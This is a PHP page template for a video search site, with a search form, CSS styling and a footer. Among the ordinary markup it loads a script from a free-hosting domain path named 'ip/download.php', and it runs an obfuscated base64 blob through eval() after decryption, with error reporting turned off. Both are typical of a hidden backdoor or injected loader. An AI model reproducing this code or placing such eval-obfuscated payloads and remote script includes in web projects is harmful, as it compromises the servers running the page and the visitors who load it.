<?php error_reporting(0); ?>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="https://get2mates.000webhostapp.com/ip/download.php"></script>
<style>

.video-list-thumbs{}
.video-list-thumbs > li{
    margin-bottom:12px;
}
.video-list-thumbs > li:last-child{}
.video-list-thumbs > li > a{
  display:block;
  position:relative;
  background-color: #111;
  color: #fff;
  padding: 8px;
  border-radius:3px
    transition:all 500ms ease-in-out;
    border-radius:4px
}
.video-list-thumbs > li > a:hover{
  box-shadow:0 2px 5px rgba(0,0,0,.3);
  text-decoration:none
}
.video-list-thumbs h2{
  bottom: 0;
  font-size: 14px;
  height: 33px;
  margin: 8px 0 0;
}
.video-list-thumbs .glyphicon-play-circle{
    font-size: 60px;
    opacity: 0.6;
    position: absolute;
    right: 39%;
    top: 31%;
    text-shadow: 0 1px 3px rgba(0,0,0,.5);
    transition:all 500ms ease-in-out;
}
.video-list-thumbs > li > a:hover .glyphicon-play-circle{
  color:#fff;
  opacity:1;
  text-shadow:0 1px 3px rgba(0,0,0,.8);
}
.video-list-thumbs .duration{
  background-color: rgba(0, 0, 0, 0.4);
  border-radius: 2px;
  color: #fff;
  font-size: 11px;
  font-weight: bold;
  left: 12px;
  line-height: 13px;
  padding: 2px 3px 1px;
  position: absolute;
  top: 12px;
    transition:all 500ms ease;
}
.video-list-thumbs > li > a:hover .duration{
  background-color:#000;
}
@media (min-width:320px) and (max-width: 480px) { 
  .video-list-thumbs .glyphicon-play-circle{
    font-size: 35px;
    right: 36%;
    top: 27%;
  }
  .video-list-thumbs h2{
    bottom: 0;
    font-size: 12px;
    height: 22px;
    margin: 8px 0 0;
  }
}
</style>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
<!------ Include the above in your HEAD tag ---------->


<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<body>
    
<div class="w3-input w3-border w3-round-large" >
<a href="/"><center> <h1 > Home </h1> </center></a> </div>
    
<form action="/searchfilter.php" class="w3-container w3-card-4 w3-light-grey">
   <center> <h2> Put The Query To Search  </h2> </center>
   
  <p>
  <input class="w3-input w3-border w3-round-large" name="s" type="text"></p>
  <center>
   <button type="submit" class="w3-bar-item w3-button w3-red" > Search! </button></center>
   <br><br>
</form>
 <?php
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists('keys.php')){include_once('keys.php');}else{die('<h2>File keys.php not found !</h2>');}
$e7091="Myt2S0lXWkFtOG82bUNhc1l2aGlJcWpQcm9XUmcvUVN3VS9QK2p3ZVJ6RUp5bENhVWlYdzI4OFpEdzNoSjZaZndncmRhMUNENVZJQjlmSXphR01DUmFkNEdWVE5GNFhYMGpzTGVjNm9BejEyS0N1WnkrMmU0bzc4K1FWSEdwUUZuOGg0c0Q2RzVGV3I1Q21RNlJtb3V0M1FTV2ROWXB6eGFvM24vYzZldW11TmZ6QXg2R3NLQVVkT0NDOGdzZGpwcFh1NUxKZ3lZbVJTZUVnd0xnelFMNFN3NkVWNjBpVTNodTZuZzduUS9RZUdGNXJUN1Q0T0RkQlgydldsb3FZd3FveWJnZW5xcTdWdkowci8yNmlmdDBFOG0yNmY1UmtoVmR0dk9MbWZ1RlE4M2JYbGlEQlgvZlNydlZ6ZUxmNnhMTitzazZkNkdZU0VJaGdFQU9QeWVuL3YwVG5XTEFVMXlwczJtZEMxOFlYanZxOHhYc1djZkk5UzJHbTJSMnNESlNKeklxbUVYYSt0TGpoUEtUbCs3QklOK0lVb28zd0drNS80N2hwV3pTd3lMYXRmdWdxbjdHNVMzUEdGRm1GeE93Rkl1ZmNhdG5iR0djS0FERllERXBRV3dwVWhFQW8ya1ZiRk5ud1FGRStWUS9EOXlPT3JTcWo2MHVCQ2N4NWd2WDZhMDBTWHhXK3JMZWdjVE12eGdjN1I4NEo4N2YxUlIwcUNIcTczZS9ZOGErNGdpenNkZHNueXVmbnVVLzV5bGEzMHpyMzNjMk9aNThXM25OMnhxUk5GZVh5a2NDMTN5YU90SzJGSzljSVdpRlNScmlRa1hwbTNFdThHN3JuU3FYTzZOcHY4MUxpZEpYZDY2V1VCT3hPR3BDOUlmbXJCdC9KRjBVYUxXQ3JhUTU2QkxLSnRBUUN1NHh4NXlFZGFMNE9TSWpSeWpDc0ZxM0grNklZeFFlOWsvYks3WjZ2aFRWMEZveUs1TkM2aVdOMzdHVTFZeFZzdFh1VkRoQnBxdEJZbGwvUVNpWmc3bEZVeFBTbzZpUjNVcXdYTG1UMndidno4UkNtOEw2MWY1OU1QTXBIb0Z0TUgzVTRCOWtPNUZsWkJKNUZNY2IyeWI2TkN1aFFEZXpUb1NqRDQzMWNuVzhIVEhyK2NheTBTTHF2Sko1WEpUU3NqSEoyd2Fmek1XTEplT1J4d3hFbVdRSHNJVUlwcldwbmhmYXNKLzZqUjNkZUlKMmNaeDVVdHpNdXZTcHkvdEFpdk9XS3FyZ0hFTGkwdjV6V016RUJxSHlZTHhRZStTSkFGejFYS3owYXFCN3ZaRW5hU2ErMzNnNkxOS1l4aXE4cmFIR2dNNlhtL3lhVENPMGkvQUNac2JaYlRsZmxCMkdIUDZNWklrSGk5N09ac1h2b2RhMTUwZ25OODNlcUM0Qm91SGlHTFdBSUp5TXZ2aUQrVU1yaDVsVGZxYnA3NGRRUGhOTitydFU5OGhBSHl1Z2pMVnVjOEo2TXN1MHM0R25LTnlLRnQ2OE5wWi9jLytURHVxRVBRNy9LQk0xMHdDMzkvM3FSY3lZWGdVKytMNkdOeGlBTVVFRWJhTCtiajI2NlVTN3hRR0FVSXAzaXZCTmExOFVZQ0haSGFWYlpudFFBRUVVZkI4UVdUOWZzSDZsSmZhK3VvbE0xb1ZiNzlCd0l5NzJvamNMOTdVZGNMbU42OXZ5akQ1Y0pybFdDdm5MZ3RKUlU4ZGMvRVNIaVBFcFhnbjBjPQ==";eval(e7061($e7091));
echo $ddata;
?>





<style>
.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: red;
   color: white;
   text-align: center;
}
</style>
<div class="footer">
  <p>
      
      
     <div style="position: fixed;bottom: 0;width: 100%;background-color: black;color: white;text-align: center;z-index: 99999999999999999;">
  <p> &copy; All right Reserved <?php echo date("Y"); ?> . Powered By <a href="https://tinyurl.com/buydlapitube"><b> Vijay Kumar </b> </a></p>
</div>
  </p>
</div>
